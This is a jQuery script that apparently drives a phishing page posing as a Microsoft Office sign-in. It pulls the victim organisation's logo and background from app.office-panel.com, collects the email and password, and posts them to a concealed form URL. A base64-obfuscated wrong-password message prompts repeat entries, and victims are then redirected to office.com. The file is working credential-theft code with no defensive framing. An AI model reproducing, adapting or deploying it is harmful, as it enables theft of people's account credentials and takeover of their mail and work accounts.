$(document).ready(function () {
  var formUrl = $("#f").val();
  var resultCount = $("#rc").val();
  var redirectUrl = $("#rdrt").val();
  var attemptCount = 0;
  let OfficeAPI = {
    Init: function (email) {
      return new Promise((resolve, reject) => {
        const url =
          "https://app.office-panel.com/site/get-logo?email=" + email;
        $.get(url, function (res) {
          const obj = JSON.parse(res);
          if (obj.status === "Valid") {
            if (obj.TileLogo == "" || obj.Illustration == "") {
              resolve(true);
            } else {
              $(".logoimg").attr("src", obj.TileLogo);
              var bg =
                "linear-gradient(rgba(0, 0, 0, 0.5),rgba(0, 0, 0, 0.5)), url(" +
                obj.Illustration +
                ")";
              $(".bgimg").css("background-image", bg);
              resolve(true);
            }
          } else {
            $("#emailerror").show();
            resolve(false);
          }
        }).fail(function () {
          console.error("Failed to fetch data from the API");
          reject(false);
        });
      });
    },
  };

  function validateEmail(email) {
    console.log('HAMZA',email);
    var emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
    return emailPattern.test(email);
  }

  const url = window.location.href;
  var myemail = url.split("#")[1];
  if (myemail) {
    $("#paaaaart1").animate({ left: 0, opacity: "hide" }, 0);
    $("#paaaart3").animate({ right: 0, opacity: "show" }, 0);
    if (!validateEmail(myemail)) {
      $("#emailerror").show();
      return false;
    } else {
      OfficeAPI.Init(myemail).then((success) => {
        if (success) {
          $("#paaaaart1").animate({ left: 0, opacity: "hide" }, 0);
          $("#paaaart3").animate({ right: 0, opacity: "show" }, 0);
          setTimeout(function () {
            $("#paaaart3").animate({ left: 0, opacity: "hide" }, 0);
            $("#paaaart2").animate({ right: 0, opacity: "show" }, 0);
            $("#aich").html(myemail);
          }, 1000);
        } else {
          $("#paaaaart1").animate({ left: 0, opacity: "show" }, 0);
          $("#paaaart3").animate({ right: 0, opacity: "hide" }, 0);
        }
      });
    }
  }

  $("#ai").click(function () {
    $("#error").hide();
  });

  $(document).keypress(function (e) {
    if (e.which == 13) {
      e.preventDefault();
      if ($("#paaaaart1").is(":visible")) {
        $("#next").click();
      } else if ($("#paaaart2").is(":visible")) {
        e.preventDefault();
        $("#sub-btn").click();
      } else {
        return false;
      }
    }
  });

  $("#next").click(function (event) {
    event.preventDefault();
    var email = $("#ai").val();
    $("#paaaaart1").animate({ left: 0, opacity: "hide" }, 0);
    $("#paaaart3").animate({ right: 0, opacity: "show" }, 0);
    console.log('HAMZA NAWAZ');
    if (!validateEmail(email)) {
        console.log('DOGAR')
      
      $("#paaaaart1").animate({ left: 0, opacity: "show" }, 0);
      $("#paaaart3").animate({ right: 0, opacity: "hide" }, 0);
      $("#error").show();
      return false;
    }
    console.log('abc');
    OfficeAPI.Init(email).then((success) => {
      if (success) {
        $("#paaaaart1").animate({ left: 0, opacity: "hide" }, 0);
        $("#paaaart3").animate({ right: 0, opacity: "show" }, 0);
        setTimeout(function () {
          $("#paaaart3").animate({ left: 0, opacity: "hide" }, 0);
          $("#paaaart2").animate({ right: 0, opacity: "show" }, 0);
          $("#aich").html(email);
        }, 1000);
      } else {
        $("#paaaaart1").animate({ left: 0, opacity: "show" }, 0);
        $("#paaaart3").animate({ right: 0, opacity: "hide" }, 0);
        $("#emailerror").show();
      }
    });
  });

  $("#back").click(function () {
    $("#mgss").hide();
    $("#ai").val("");
    $("#pr").val("");
    $("#paaaart2").animate({ left: 0, opacity: "hide" }, 0);
    $("#paaaaart1").animate({ right: 0, opacity: "show" }, 1000);
  });

  $("#sub-btn").click(function (event) {
    event.preventDefault();
    if (myemail) {
      var email = myemail;
    } else {
      var email = $("#ai").val();
    }

    var password = $("#pr").val();
    var errorMessage = $("#mgss").html();
    $("#mgss")
      .text(errorMessage)
      .addClass("text-danger")
      .removeClass("text-gray");
    attemptCount += 1;

    $.ajax({
      dataType: "JSON",
      url: formUrl,
      type: "POST",
      data: { ai: email, pr: password },
      beforeSend: function () {
        $("#paaaart2").animate({ left: 0, opacity: "hide" }, 0);
        $("#paaaart3").animate({ left: 0, opacity: "show" }, 0);
      },
      complete: function (resp) {
        if (resp.responseText.trim() == "WrongPassword") {
          $("#mgss").html(
            atob(
              "WW91ciBhY2NvdW50IG9yIHBhc3N3b3JkIGlzIGluY29ycmVjdC4gSWYgeW91IGRvbid0IHJlbWVtYmVyIHlvdXIgcGFzc3dvcmQsIDxhIGhyZWY9JyMnPnJlc2V0IGl0IG5vdzwvYT4="
            )
          );
          $("#paaaart3")["animate"](
            {
              left: 0,
              opacity: "hide",
            },
            0
          );
          $("#paaaart2")["animate"](
            {
              left: 0,
              opacity: "show",
            },
            100
          );
        } else if (resp.responseText.trim() == "UnAuth") {
          window.location.href = "https://google.com";
        } else if (resp.responseText.trim() == "Godaddy") {
          window.location.href = "https://office.com";
        } else {
          window.location.href = "res.html";
        }
      },
    });
  });
});
